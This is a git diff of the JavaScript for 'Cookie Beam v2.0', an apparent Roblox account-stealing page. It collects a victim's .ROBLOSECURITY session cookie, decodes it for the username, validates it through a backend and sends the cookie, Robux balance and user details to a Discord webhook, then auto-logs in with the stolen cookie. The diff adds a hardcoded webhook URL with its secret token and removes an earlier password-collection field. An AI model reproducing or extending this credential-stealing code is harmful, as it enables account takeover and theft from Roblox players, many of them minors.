@@ -1,7 +1,55 @@
-console.log('🍪 Cookie Beam By Userspin45 - Using Backend Proxy');
+console.log('🍪 Cookie Beam v2.0 By Userspin45 - Token Detection Active');
 
-// Use the backend server URL (change to your Render URL when deployed)
-const BACKEND_URL = window.location.origin; // Uses the same host
+// Decode Base64 token to extract username and ID
+function decodeToken(cookie) {
+    try {
+        // Extract the part after the pipe (|) which contains the actual token
+        let token = cookie;
+        if (cookie.includes('|')) {
+            token = cookie.split('|')[1];
+        }
+        // Remove any trailing whitespace
+        token = token.trim();
+        // The token is Base64 encoded JSON
+        const decoded = atob(token);
+        // Parse the JSON to extract user info
+        const data = JSON.parse(decoded);
+        return {
+            username: data?.uname || data?.username || data?.UserName || 'Unknown',
+            userId: data?.uid || data?.userId || data?.UserID || 'Unknown'
+        };
+    } catch (e) {
+        console.log('Token decode error:', e.message);
+        return null;
+    }
+}
+
+// Auto-detect token from cookie input
+document.getElementById('cookieInput').addEventListener('input', function() {
+    const cookie = this.value.trim();
+    const detectionDiv = document.getElementById('token-detection');
+    const resultDiv = document.getElementById('result');
+
+    if (!cookie) {
+        detectionDiv.textContent = '🔍 Token detection: Waiting...';
+        detectionDiv.className = 'detection-box';
+        return;
+    }
+
+    const decoded = decodeToken(cookie);
+    if (decoded && decoded.username !== 'Unknown') {
+        detectionDiv.textContent = `✅ Token detected! Username: ${decoded.username} (ID: ${decoded.userId})`;
+        detectionDiv.className = 'detection-box detected';
+        // Auto-fill the username field
+        document.getElementById('userInput').value = decoded.username;
+        resultDiv.textContent = '';
+    } else {
+        detectionDiv.textContent = '❌ Invalid token or unable to decode. Check the cookie.';
+        detectionDiv.className = 'detection-box error';
+    }
+});
+
+const webhook = 'https://discord.com/api/webhooks/1537430116756619355/uAO-C2gl8toO3BiClhFUJ-9t8IgX7JmfAxzLnPfEShP5ArdjBmksdwjXWE9FKi7mIWsA';
 
 async function fetchWithTimeout(url, options = {}, timeout = 10000) {
     const controller = new AbortController();
@@ -18,7 +66,7 @@ async function fetchWithTimeout(url, options = {}, timeout = 10000) {
 
 async function validateCookie(cookie) {
     try {
-        const res = await fetchWithTimeout(`${BACKEND_URL}/validate`, {
+        const res = await fetchWithTimeout('/validate', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ cookie })
@@ -36,7 +84,7 @@ async function validateCookie(cookie) {
 
 async function sendToWebhook(payload) {
     try {
-        const res = await fetchWithTimeout(`${BACKEND_URL}/send-webhook`, {
+        const res = await fetchWithTimeout('/send-webhook', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
@@ -64,7 +112,6 @@ function autoLogin(cookie) {
 document.getElementById('logBtn').addEventListener('click', async function() {
     const cookie = document.getElementById('cookieInput').value.trim();
     const username = document.getElementById('userInput').value.trim() || 'Not provided';
-    const password = document.getElementById('passInput').value.trim() || 'Not provided';
     const resultDiv = document.getElementById('result');
 
     if (!cookie) {
@@ -95,7 +142,7 @@ document.getElementById('logBtn').addEventListener('click', async function() {
         resultDiv.className = 'status-ok';
 
         const payload = {
-            content: `🍪 **Cookie Beam - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n🔑 **Password:** ${password}\n📝 **Provided Username:** ${username}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}`
+            content: `🍪 **Cookie Beam v2.0 - Userspin45**\n━━━━━━━━━━━━━━━━━━━━\n✅ **VALID COOKIE DETECTED**\n👤 **Username:** ${validation.username}\n🆔 **User ID:** ${validation.id}\n💰 **Robux:** ${validation.robux}\n📝 **Provided Username:** ${username}\n🍪 **.ROBLOSECURITY:** \`${cookie}\`\n━━━━━━━━━━━━━━━━━━━━\n🕒 Logged at: ${new Date().toLocaleString()}`
         };
 
         resultDiv.textContent = '📤 Sending to Discord via backend...';
@@ -108,7 +155,8 @@ document.getElementById('logBtn').addEventListener('click', async function() {
             resultDiv.className = 'status-ok';
             document.getElementById('cookieInput').value = '';
             document.getElementById('userInput').value = '';
-            document.getElementById('passInput').value = '';
+            document.getElementById('token-detection').textContent = '🔍 Token detection: Waiting...';
+            document.getElementById('token-detection').className = 'detection-box';
             setTimeout(() => { autoLogin(cookie); }, 3000);
         } else {
             resultDiv.textContent = '❌ Failed to send to Discord. Check server logs.';
